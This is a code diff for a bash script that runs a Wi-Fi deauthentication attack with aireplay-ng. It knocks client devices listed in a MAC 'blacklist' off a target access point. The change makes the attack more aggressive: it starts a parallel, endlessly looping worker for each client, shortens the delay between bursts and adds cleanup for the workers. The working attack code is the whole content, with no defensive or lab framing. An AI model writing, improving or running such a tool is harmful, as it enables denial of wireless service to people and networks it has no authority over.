@@ -21,10 +21,13 @@ for var in "${REQUIRED_VARS[@]}"; do
 done
 
 WATCHDOG_INTERVAL="${WATCHDOG_INTERVAL:-60}"
-DEAUTH_COUNT="${DEAUTH_COUNT:-5}"
-DEAUTH_SLEEP="${DEAUTH_SLEEP:-3}"
+DEAUTH_COUNT="${DEAUTH_COUNT:-1}"
+DEAUTH_SLEEP="${DEAUTH_SLEEP:-0.5}"
+MAX_PARALLEL="${MAX_PARALLEL:-4}"
+STAGGER_DELAY="${STAGGER_DELAY:-0.3}"
 
 WATCHDOG_PID=""
+WORKER_PIDS=()
 
 resolve_iface_by_driver() {
   local target_driver="$1"
@@ -82,12 +85,17 @@ channel_watchdog() {
 cleanup() {
   echo ""
   echo "[*] Stopping attack..."
+  for pid in "${WORKER_PIDS[@]}"; do
+    kill "$pid" 2>/dev/null || true
+  done
+  for pid in "${WORKER_PIDS[@]}"; do
+    wait "$pid" 2>/dev/null || true
+  done
   if [ -n "$WATCHDOG_PID" ]; then
     kill "$WATCHDOG_PID" 2>/dev/null || true
     wait "$WATCHDOG_PID" 2>/dev/null || true
-    echo "[*] Watchdog stopped"
   fi
-  echo "[*] Exiting."
+  echo "[*] All workers stopped. Exiting."
   exit 0
 }
 
@@ -138,29 +146,44 @@ channel_watchdog "$IFACE" "$CHANNEL" &
 WATCHDOG_PID=$!
 echo "[+] Channel watchdog started (PID $WATCHDOG_PID, interval ${WATCHDOG_INTERVAL}s)"
 
-echo "[*] Starting deauth attack against AP $AP_BSSID on $IFACE (channel $CHANNEL)..."
+deauth_worker() {
+  local mac="$1" bssid="$2" iface="$3" count="$4" pause="$5"
+  while true; do
+    sudo aireplay-ng --deauth "$count" -a "$bssid" -c "$mac" "$iface" >/dev/null 2>&1 || true
+    sleep "$pause"
+  done
+}
+
+MACS=()
+while read -r mac _; do
+  [ -z "$mac" ] && continue
+  [[ "$mac" == \#* ]] && continue
+  MACS+=("$mac")
+done < "$BLACKLIST"
+
+TOTAL=${#MACS[@]}
+if [ "$TOTAL" -eq 0 ]; then
+  echo "ERROR: No MACs found in $BLACKLIST" >&2
+  exit 1
+fi
+
+echo "[*] Starting deauth against AP $AP_BSSID on $IFACE (channel $CHANNEL)"
+echo "[*] Targets: $TOTAL MACs | Workers: $MAX_PARALLEL | DeAuth count: $DEAUTH_COUNT | Sleep: ${DEAUTH_SLEEP}s"
 echo ""
 
-while true; do
-  while read -r mac _; do
-    [ -z "$mac" ] && continue
-    [[ "$mac" == \#* ]] && continue
-    set +e
-    sudo aireplay-ng --deauth "$DEAUTH_COUNT" \
-      -a "$AP_BSSID" \
-      -c "$mac" \
-      "$IFACE"
-    rc=$?
-    set -e
-    if [ "$rc" -ne 0 ]; then
-      echo "[WARN] aireplay-ng failed (rc=$rc) for STA $mac. Continuing..."
-      echo "[WARN] Reinitializing monitor mode on $IFACE to recover adapter state."
-      if ! setup_monitor "$IFACE" "$CHANNEL" "$MAC_SPOOF"; then
-        echo "[WARN] Failed to reinitialize $IFACE. Retrying in ${DEAUTH_SLEEP}s..."
-      fi
-      sleep "$DEAUTH_SLEEP"
-      continue
-    fi
-    sleep "$DEAUTH_SLEEP"
-  done < "$BLACKLIST"
+batch=0
+for mac in "${MACS[@]}"; do
+  deauth_worker "$mac" "$AP_BSSID" "$IFACE" "$DEAUTH_COUNT" "$DEAUTH_SLEEP" &
+  WORKER_PIDS+=($!)
+  echo "[+] Worker for $mac (PID ${WORKER_PIDS[-1]})"
+  batch=$((batch + 1))
+
+  if [ "$batch" -ge "$MAX_PARALLEL" ]; then
+    sleep "$STAGGER_DELAY"
+    batch=0
+  fi
 done
+
+echo ""
+echo "[*] All $TOTAL workers running. Press Ctrl+C to stop."
+wait
